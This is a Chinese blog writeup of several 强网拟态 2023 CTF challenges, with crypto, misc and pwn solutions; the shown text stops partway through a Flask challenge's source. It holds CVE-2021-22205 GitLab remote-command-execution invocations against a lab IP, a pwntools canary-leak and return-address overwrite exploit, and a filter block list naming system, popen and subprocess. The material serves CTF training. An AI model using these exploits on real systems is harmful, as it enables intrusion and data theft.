@@ -1,0 +1,321 @@
+<!DOCTYPE html><html lang="en"> <head><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>强网拟态 2023 Writeup</title><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="sitemap" href="/sitemap-index.xml"><link rel="alternate" type="application/atom+xml" title="Hi, I Am I" href="https://5ime.cn/atom.xml"><meta name="generator" content="Astro v5.9.0"><link rel="preload" href="/fonts/atkinson-regular.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/fonts/atkinson-bold.woff" as="font" type="font/woff" crossorigin><link rel="canonical" href="https://5ime.cn/mimic-2023/"><title>强网拟态 2023 Writeup
+
+
+
+<!-- Open Graph / Facebook -->
+
+
+
+
+
+<!-- Twitter -->
+
+
+
+</title><meta name="title" content="强网拟态 2023 Writeup"><meta name="description" content><meta property="og:type" content="website"><meta property="og:url" content="https://5ime.cn/mimic-2023/"><meta property="og:title" content="强网拟态 2023 Writeup"><meta property="og:description" content><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://5ime.cn/mimic-2023/"><meta property="twitter:title" content="强网拟态 2023 Writeup"><meta property="twitter:description" content><link rel="stylesheet" href="/_astro/_slug_.D2NkKxuK.css">
+<link rel="stylesheet" href="/_astro/waline.nkDt9Ep-.css">
+<link rel="stylesheet" href="/_astro/_slug_.D48ksWp2.css">
+<link rel="stylesheet" href="/_astro/_slug_.DEy1TFvp.css">
+<style>#waline[data-astro-cid-cjuph4ok]{margin:2rem 0}
+</style></head> <!-- Global Metadata --> <!-- Font preloads --> <!-- Canonical URL --> <!-- Primary Meta Tags --> <script type="module">document.addEventListener("DOMContentLoaded",()=>{const a=document.getElementById("article");if(a){const n=a.getElementsByTagName("img");Array.from(n).forEach(e=>{const t=document.createElement("a");t.setAttribute("data-fancybox","gallery"),t.href=e.src,e.parentNode?.insertBefore(t,e),t.appendChild(e)})}});</script></head> <body class="bg-white"> <header class="relative m-0 px-4 py-4 mb-8" data-astro-cid-3ef6ksr2> <nav class="flex items-center justify-between w-full" data-astro-cid-3ef6ksr2> <!-- 桌面端导航 --> <div class="hidden md:flex items-center space-x-4 w-full justify-center" data-astro-cid-3ef6ksr2> <a href="/" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Home </a> <a href="/archive" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Blog </a> <a href="/links" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Links </a> <a href="/guestbook" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Comment </a> <a href="/about" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> About </a> </div> <!-- 移动端菜单按钮 --> <button id="menu-btn" class="md:hidden flex flex-col space-y-1 p-2 text-black" data-astro-cid-3ef6ksr2> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> </button> <!-- 移动端下拉菜单 --> <div id="menu" class="md:hidden absolute top-full left-0 w-full bg-white dark:bg-gray-900 shadow-lg border-t dark:border-gray-700 hidden" data-astro-cid-3ef6ksr2> <div class="flex flex-col py-2" data-astro-cid-3ef6ksr2> <a href="/" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Home </a> <a href="/archive" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Blog </a> <a href="/links" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Links </a> <a href="/guestbook" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Comment </a> <a href="/about" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> About </a> </div> </div> </nav> </header> <script type="module">const e=document.getElementById("menu-btn"),t=document.getElementById("menu");e?.addEventListener("click",()=>{t?.classList.toggle("hidden"),e.classList.toggle("open")});document.addEventListener("click",n=>{!e?.contains(n.target)&&!t?.contains(n.target)&&(t?.classList.add("hidden"),e?.classList.remove("open"))});</script>  <main class="min-h-screen"> <article class="max-w-4xl mx-auto px-2 md:px-6 pt-6 pb-32">  <header class="mb-12"> <h1 class="text-4xl md:text-5xl font-semibold text-gray-900 mb-6 tracking-tight leading-tight"> 强网拟态 2023 Writeup </h1> <div class="flex flex-wrap items-center gap-3 text-sm font-light"> <time datetime="2023-11-12T16:10:47.000Z" class="text-[#86868b] tracking-wide"> <time datetime="2023-11-12T16:10:47.000Z"> Nov 13, 2023 </time> </time> <span class="text-[#d2d2d7] flex items-center">|</span>
+							
+							<div class="flex items-center"> <span class="flex items-center"> <a href="/categories/技术/" class="text-[#86868b] hover:text-[#0066cc] transition-colors duration-300 tracking-wide font-light"> 技术 </a>  </span> </div>  <span class="text-[#d2d2d7] flex items-center">|</span> <div class="flex items-center"> <span class="flex items-center"> <a href="/tags/CTF/" class="text-[#86868b] hover:text-[#0066cc] transition-colors duration-300 tracking-wide font-light"> CTF </a> <span class="text-[#d2d2d7] mx-2">·</span> </span><span class="flex items-center"> <a href="/tags/网络安全/" class="text-[#86868b] hover:text-[#0066cc] transition-colors duration-300 tracking-wide font-light"> 网络安全 </a> <span class="text-[#d2d2d7] mx-2">·</span> </span><span class="flex items-center"> <a href="/tags/Writeup/" class="text-[#86868b] hover:text-[#0066cc] transition-colors duration-300 tracking-wide font-light"> Writeup </a>  </span> </div>  </div> </header>  <nav class="toc" data-astro-cid-woz2nwfv> <h2 class="toc-title" data-astro-cid-woz2nwfv>目录</h2> <ol class="toc-list" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#写在前面" class="toc-link" data-astro-cid-woz2nwfv> 1. 写在前面 </a>  </li><li data-astro-cid-woz2nwfv> <a href="#crypto" class="toc-link" data-astro-cid-woz2nwfv> 2. Crypto </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#一眼看出" class="toc-link" data-astro-cid-woz2nwfv> 2.1. 一眼看出 </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#v2xsec" class="toc-link" data-astro-cid-woz2nwfv> 3. V2XSec </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#新型车联网安全网络协议破解阶段一" class="toc-link" data-astro-cid-woz2nwfv> 3.1. 新型车联网安全网络协议破解（阶段一） </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#misc" class="toc-link" data-astro-cid-woz2nwfv> 4. Misc </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#welcome" class="toc-link" data-astro-cid-woz2nwfv> 4.1. Welcome </a> </li><li data-astro-cid-woz2nwfv> <a href="#国际象棋与二维码" class="toc-link" data-astro-cid-woz2nwfv> 4.2. 国际象棋与二维码 </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#mimic" class="toc-link" data-astro-cid-woz2nwfv> 5. Mimic </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#拟态控制器" class="toc-link" data-astro-cid-woz2nwfv> 5.1. 拟态控制器 </a> </li><li data-astro-cid-woz2nwfv> <a href="#tbox-can" class="toc-link" data-astro-cid-woz2nwfv> 5.2. Tbox Can </a> </li><li data-astro-cid-woz2nwfv> <a href="#find-me-and-crack-me" class="toc-link" data-astro-cid-woz2nwfv> 5.3. find me and crack me </a> </li><li data-astro-cid-woz2nwfv> <a href="#用户登记系统" class="toc-link" data-astro-cid-woz2nwfv> 5.4. 用户登记系统 </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#web" class="toc-link" data-astro-cid-woz2nwfv> 6. Web </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#noumisotuitennnoka" class="toc-link" data-astro-cid-woz2nwfv> 6.1. noumisotuitennnoka </a> </li> </ol> </li> </ol> </nav>  <script type="module">document.querySelectorAll(".toc-link").forEach(o=>{o.addEventListener("click",t=>{t.preventDefault();const e=o.getAttribute("href")?.slice(1);if(e){const i=document.getElementById(e);if(i){const c=i.getBoundingClientRect().top+window.pageYOffset-100;window.scrollTo({top:c,behavior:"smooth"})}}})});const s=new IntersectionObserver(o=>{const t=o.filter(e=>e.isIntersecting);if(t.length>0){const i=t.reduce((n,c)=>n.boundingClientRect.top<c.boundingClientRect.top?n:c).target.id;document.querySelectorAll(".toc-link.active").forEach(n=>n.classList.remove("active"));const r=document.querySelector(`.toc-link[href="#${i}"]`);r&&r.classList.add("active")}},{rootMargin:"-10% 0px -70% 0px",threshold:[0,.5,1]});document.querySelectorAll(".toc-link").forEach(o=>{const t=o.getAttribute("href")?.slice(1);if(t){const e=document.getElementById(t);e&&s.observe(e)}});</script>  <div class="fancybox-container">  <div id="article" class="prose prose-lg max-w-none">   <h2 id="写在前面">写在前面</h2>
+<p>整体来说还算可以，不过有几个槽点：两道题需要去根据语义猜答案，吃了没文化的亏，另外不知道为什么车联网用原题，据其他师傅说今年第四次见到这三道题了…<!--more--></p>
+<h2 id="crypto">Crypto</h2>
+<h3 id="一眼看出">一眼看出</h3>
+<blockquote>
+<p>一眼看穿</p>
+</blockquote>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> Crypto.Util.number </span><span style="color:#F97583">import</span><span style="color:#E1E4E8"> long_to_bytes</span></span>
+<span class="line"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> gmpy2</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">n </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 121027298948349995679677982412648544403333177260975245569073983061538581058440163574922807151182889153495253964764966037308461724272151584478723275142858008261257709817963330011376266261119767294949088397671360123321149414700981035517299807126625758046100840667081332434968770862731073693976604061597575813313</span></span>
+<span class="line"><span style="color:#E1E4E8">c </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 42256117129723577554705402387775886393426604555611637074394963219097781224776058009003521565944180241032100329456702310737369381890041336312084091995865560402681403775751012856436207938771611177592600423563671217656908392901713661029126149486651409531213711103407037959788587839729511719756709763927616470267</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">a </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> gmpy2.isqrt(n)</span></span>
+<span class="line"><span style="color:#E1E4E8">b2 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> gmpy2.sub(gmpy2.square(a), n)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">while</span><span style="color:#F97583"> not</span><span style="color:#E1E4E8"> gmpy2.is_square(b2):</span></span>
+<span class="line"><span style="color:#E1E4E8">    a </span><span style="color:#F97583">+=</span><span style="color:#79B8FF"> 1</span></span>
+<span class="line"><span style="color:#E1E4E8">    b2 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> gmpy2.sub(gmpy2.square(a), n)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">b </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> gmpy2.isqrt(b2)</span></span>
+<span class="line"><span style="color:#E1E4E8">p </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> gmpy2.sub(a, b)</span></span>
+<span class="line"><span style="color:#E1E4E8">q </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> gmpy2.add(a, b)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">phi </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> gmpy2.mul(gmpy2.sub(p, </span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">), gmpy2.sub(q, </span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">))</span></span>
+<span class="line"><span style="color:#E1E4E8">d </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> gmpy2.invert(</span><span style="color:#79B8FF">65537</span><span style="color:#E1E4E8">, phi)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">m </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> pow</span><span style="color:#E1E4E8">(c, d, n)</span></span>
+<span class="line"><span style="color:#E1E4E8">flag </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> long_to_bytes(m)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(flag.decode())</span></span>
+<span class="line"><span style="color:#6A737D"># flag{621f7c4f-21de-8566-649e-5a883ce318dc}</span></span></code></pre>
+<h2 id="v2xsec">V2XSec</h2>
+<blockquote>
+<p>某地方企业内网中采用自己设计的车联网安全通信协议（Vehicle networking security communication protocol，VSCP）与车联网应用进行通信以实现控制车辆的目的，利用该协议接发的所有网络数据包均含有用户的身份。选手需要通过漏洞利用、数据包解析以及数据包伪造三个步骤完成攻击。</p>
+</blockquote>
+<h3 id="新型车联网安全网络协议破解阶段一">新型车联网安全网络协议破解（阶段一）</h3>
+<blockquote>
+<p>阶段一: 内网服务器漏洞利用</p>
+<ol>
+<li>参赛选手利用VPN客户端可以登入内网服务器Server1，该内网服务器被安全团队指出拥有某种漏洞，但内网管理员仍未采取任何安全措施。</li>
+<li>Server1与车联网服务器Server2定时通信 (通信程序名为Vehicle Controller) ，通信时使用VSCP协议。</li>
+<li>参赛选手需要挖掘并利用系统漏洞，获取Vehicle Controller程序的执行路径，执行路径下有flag，提交正确的flag即视为解题成功。</li>
+<li>VPN下载链接： 链接：<a href="https://share.weiyun.com/LGGUOBfj">https://share.weiyun.com/LGGUOBfj</a> 密码：x9yuf8</li>
+<li>Server1的IP地址给出为: 172.18.0.4。</li>
+</ol>
+</blockquote>
+<p>这题没啥好说的，从看到VPN的那一刻起就觉得眼熟，打开 IP 之后发现 Gitlab 就知道了… 确实是原题，IP都没变，具体操作参考我当年的文章 <a href="https://5ime.cn/iscc-2022-measure.html">ISCC 2022 实战题 Writeup</a>，这里贴一下主要执行命令，当年是找到 PID 号即可，这次是要求找到进程文件所在目录。</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#E1E4E8">python .\</span><span style="color:#FDAEB7;font-style:italic">CVE-2021-22205.py -a true -t http://172.18.0.4/ -c "ps -aux > /home/git/gitlab/public/assets/12222.txt"</span></span>
+<span class="line"><span style="color:#E1E4E8">python .\</span><span style="color:#FDAEB7;font-style:italic">CVE-2021-22205.py -a true -t http://172.18.0.4/ -c "ls /proc/5452 -l > /home/git/gitlab/public/assets/12222.txt"</span></span>
+<span class="line"><span style="color:#E1E4E8">python .\</span><span style="color:#FDAEB7;font-style:italic">CVE-2021-22205.py -a true -t http://172.18.0.4/ -c "cat /home/mping/flag > /home/git/gitlab/public/assets/12222.txt"</span></span></code></pre>
+<h2 id="misc">Misc</h2>
+<h3 id="welcome">Welcome</h3>
+<blockquote>
+<p>欢迎大家参加第六届“强网”拟态防御国际精英挑战赛！
+本场flag兑换凭证如下：ZmxhZ3tNaW1pY195eWRzJkcwZF9Kb0JfQ1RGZXJ+fQ==
+预祝大家取得好成绩！</p>
+</blockquote>
+<p>直接 Base64 解码即可</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>flag{Mimic_yyds&#x26;G0d_JoB_CTFer~}</span></span></code></pre>
+<h3 id="国际象棋与二维码">国际象棋与二维码</h3>
+<blockquote>
+<p>你见过国际象棋的棋盘吗</p>
+</blockquote>
+<p>国际象棋棋盘也是黑白两色，同时给出的附件也是黑白两色的正方形，直接尝试用 49 * 49 的棋盘和题目进行异或，得到正确的二维码</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#F97583">from</span><span style="color:#79B8FF"> PIL</span><span style="color:#F97583"> import</span><span style="color:#E1E4E8"> Image</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">img </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> Image.new(</span><span style="color:#9ECBFF">'RGB'</span><span style="color:#E1E4E8">, (</span><span style="color:#79B8FF">49</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">49</span><span style="color:#E1E4E8">))</span></span>
+<span class="line"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> x </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">49</span><span style="color:#E1E4E8">):</span></span>
+<span class="line"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> y </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">49</span><span style="color:#E1E4E8">):</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (x </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> y) </span><span style="color:#F97583">%</span><span style="color:#79B8FF"> 2</span><span style="color:#F97583"> ==</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#E1E4E8">            img.putpixel((x, y), (</span><span style="color:#79B8FF">255</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">255</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">255</span><span style="color:#E1E4E8">))</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">img </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> img.resize((</span><span style="color:#79B8FF">500</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">500</span><span style="color:#E1E4E8">), Image.</span><span style="color:#79B8FF">NEAREST</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">img.save(</span><span style="color:#9ECBFF">'test.png'</span><span style="color:#E1E4E8">)</span></span></code></pre>
+<p><img src="https://img.5ime.cn/mimic-2023/image-20231111163341814.png" alt="image-20231111163341814"></p>
+<h2 id="mimic">Mimic</h2>
+<h3 id="拟态控制器">拟态控制器</h3>
+<blockquote>
+<p>程序员小荆今年的任务是开发拟态控制器。他在nbctl命令中增加了一处密码认证，将其改造成认证密码后查询。Teamleader后期代码审查时发现其中有一处溢出漏洞，就干脆把这段代码拿出来做了个demo，初赛题目这不就来了吗。
+仔细一想，黑盒赛赛题这不也来了吗。</p>
+<p>现请提交该flag。</p>
+</blockquote>
+<p>第一次泄露 canary，第二次覆盖返回地址低位</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> pwn </span><span style="color:#F97583">import</span><span style="color:#F97583"> *</span></span>
+<span class="line"><span style="color:#E1E4E8">context.log_level </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> 'debug'</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">io </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> remote(</span><span style="color:#9ECBFF">"pwn-91ac7455dc.challenge.xctf.org.cn"</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">9999</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">ssl</span><span style="color:#F97583">=</span><span style="color:#79B8FF">True</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">p </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 40</span><span style="color:#F97583"> *</span><span style="color:#F97583"> b</span><span style="color:#9ECBFF">'a'</span><span style="color:#F97583"> +</span><span style="color:#F97583"> b</span><span style="color:#9ECBFF">'^'</span></span>
+<span class="line"><span style="color:#E1E4E8">io.sendafter(</span><span style="color:#9ECBFF">"ler query command:"</span><span style="color:#E1E4E8">, p)</span></span>
+<span class="line"><span style="color:#E1E4E8">io.recvuntil(</span><span style="color:#9ECBFF">"^"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">canary </span><span style="color:#F97583">=</span><span style="color:#F97583"> b</span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\0</span><span style="color:#9ECBFF">'</span><span style="color:#F97583"> +</span><span style="color:#E1E4E8"> io.recv(</span><span style="color:#79B8FF">7</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">p </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> canary </span><span style="color:#F97583">*</span><span style="color:#79B8FF"> 7</span><span style="color:#F97583"> +</span><span style="color:#E1E4E8"> p8(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">0a</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">io.send(p)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">io.interactive()</span></span></code></pre>
+<h3 id="tbox-can">Tbox Can</h3>
+<blockquote>
+<p>智能网联车上WIFI的密码常常通过can报文传输，请分析can报文，提取WIFI密码，flag的格式为 flag{password}</p>
+</blockquote>
+<p>下载附件得到一个表格，看不懂一点，随手把 Data 里的数据全都复制出来转换了一下，发现没毛病，主要的数据在 <code>0x000000000000061A</code> 这个 <code>CAN ID</code> 里面</p>
+<p><img src="https://img.5ime.cn/mimic-2023/image-20231111193419521.png" alt="image-20231111193419521"></p>
+<p>提交半天不对，最后根据语义和大量提交得出最终 flag</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>flag{L0GIC_ANALYSIS_FOR_FUN}</span></span></code></pre>
+<h3 id="find-me-and-crack-me">find me and crack me</h3>
+<blockquote>
+<p>题目中存在隐藏的说明文档，获取并解密此文档后，即可按照提示获取flag</p>
+</blockquote>
+<p>打开环境发现注释里存在密文和密钥</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>KEY:N2RlMzhmM2MzZDNiYWE3Y2E1OGEzNjZmMDk1Nzc1ODY=</span></span>
+<span class="line"><span>encrypt word: YWY2NTRiZTc5ZjkyNGE2ZDA3MGFlYjE5ZWMxN2U4Y2NjMTJkNWExYWY2NTc0YzE4YmMyYzI3YWFkZjZmZjRhN2Y4ZDUwOTBmMTVkNDBiM2Y2ZTFhMzIxMDNmOGMwMjgxNmJmZTMzMTY4ZGFmNzJkMzBiOTAwMTgxYzliMGQ5MGEyNmNmNDZiZGUyNjA4NDE5YWM1MmE0NmVjZDQwYjlhZWYwMzczYjcyODExNTg0YzE3MjJmYzU4Y2NmYjhlYzM4N2RmZTc2ODRjOTIzYWVlMWM1ZGU0NWI5NDIxMThjYjBjMGYwYzIwNWJkODA0N2M3MjczY2RiYjYwNWQwMzMxNzcwZjk3NDM0M2ZhN2FiNjQ1YWVkMzQ2MjRkMzQ5ODRkODU2YWY2MzkwMWUxZDU0MjFjMWRmZDcyMjUxZDBkOTU=</span></span></code></pre>
+<p>Base64解码后得到</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>KEY:7de38f3c3d3baa7ca58a366f09577586</span></span>
+<span class="line"><span>encrypt word: af654be79f924a6d070aeb19ec17e8ccc12d5a1af6574c18bc2c27aadf6ff4a7f8d5090f15d40b3f6e1a32103f8c02816bfe33168daf72d30b900181c9b0d90a26cf46bde2608419ac52a46ecd40b9aef0373b72811584c1722fc58ccfb8ec387dfe7684c923aee1c5de45b942118cb0c0f0c205bd8047c7273cdbb605d0331770f974343fa7ab645aed34624d34984d856af63901e1d5421c1dfd72251d0d95</span></span></code></pre>
+<p>将 KEY 进行 md5 解密后得到 <code>secrets</code>，然后对 <code>encrypt word</code> 进行 DES 解密</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>1.maybe used first url get random:</span></span>
+<span class="line"><span>/mimic_storage</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>2.maybe used second url get flag:</span></span>
+<span class="line"><span>/getflag?sec=random&#x26;path=xxxx</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>xxx is:</span></span>
+<span class="line"><span>MVhuOtClaoE5899iOuiSWkvqxsrRimmb</span></span></code></pre>
+<p><img src="https://img.5ime.cn/mimic-2023/image-20231111220355321.png" alt="image-20231111220355321"></p>
+<p>剩下的就没啥好说的了，根据题目提示挨个访问即可得到 flag</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>/getflag?sec=[/mimic_storage获取的random]&#x26;path=MVhuOtClaoE5899iOuiSWkvqxsrRimmb</span></span></code></pre>
+<h3 id="用户登记系统">用户登记系统</h3>
+<blockquote>
+<p>小张同学学习了拟态防御理论，利用刚学会了web开发技术，开发一个用户信息登记系统的demo，你能找漏洞吗？
+(flag全部为小写，flag文件在/tmp/目录下)</p>
+</blockquote>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> random</span></span>
+<span class="line"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> flask </span><span style="color:#F97583">import</span><span style="color:#E1E4E8"> Flask, request, render_template_string, abort, redirect</span></span>
+<span class="line"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> string</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">white_list </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> string.ascii_letters </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> string.digits </span><span style="color:#F97583">+</span><span style="color:#9ECBFF"> '()_-</span><span style="color:#79B8FF">{}</span><span style="color:#9ECBFF">."[]=/'</span></span>
+<span class="line"><span style="color:#6A737D">#mimic-defense-31919-heterogeneous</span></span>
+<span class="line"><span style="color:#6A737D">#mimic-defense-29414-heterogeneous</span></span>
+<span class="line"><span style="color:#E1E4E8">black_list </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> [</span><span style="color:#9ECBFF">'codecs'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'system'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'for'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'if'</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#9ECBFF">              'end'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'os'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'eval'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'request'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'write'</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#9ECBFF">              'mro'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'compile'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'execfile'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'exec'</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#9ECBFF">              'subprocess'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'importlib'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'platform'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'timeit'</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#9ECBFF">              'import'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'linecache'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'module'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'getattribute'</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#9ECBFF">              'pop'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'getitem'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'decode'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'popen'</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#9ECBFF">              'ifconfig'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'flag'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'config'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'cat'</span><span style="color:#E1E4E8">]</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">app </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> Flask(</span><span style="color:#79B8FF">__name__</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#6A737D">#mimic-defense-94180-heterogeneous</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">@app.after_request</span></span>
+<span class="line"><span style="color:#F97583">def</span><span style="color:#B392F0"> modify_headers</span><span style="color:#E1E4E8">(response):</span></span>
